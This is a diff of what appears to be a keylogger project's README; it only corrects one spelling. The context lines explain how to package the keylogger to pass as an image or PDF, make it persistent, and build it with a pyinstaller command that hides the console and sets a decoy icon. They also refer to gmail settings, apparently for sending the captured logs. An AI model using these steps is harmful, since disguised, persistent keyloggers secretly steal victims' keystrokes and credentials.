@@ -8,7 +8,7 @@ You can search that in security settings of your gmail account<br /><br />
 And at this time I am using pyinstaller==3.5 (version) that is running errorless for me. <br /><br />
 --> To package this into image/pdf/anything you have to first edit the 'Keylogger.py' file and erase the '#' in line 34   i.e. '#self.check_file()' into 'self.check_file()' <br />
 For more info on pyinstaller visit 'https://pyinstaller.readthedocs.io/en/stable/usage.html'.
-After Packaging it will become persistant too.<br /><br />
+After Packaging it will become persistent too.<br /><br />
 --> The command of pyinstaller require to use for this file is as:<br />
 'C:/Python27/Scripts/pyinstaller.exe --add-data "@'location of file'@;." --icon "@'location of icon'@" --onefile --noconsole keylogger.py'<br /><br />
 --> __Ignore the @. these are just to distinguish__<br /><br />
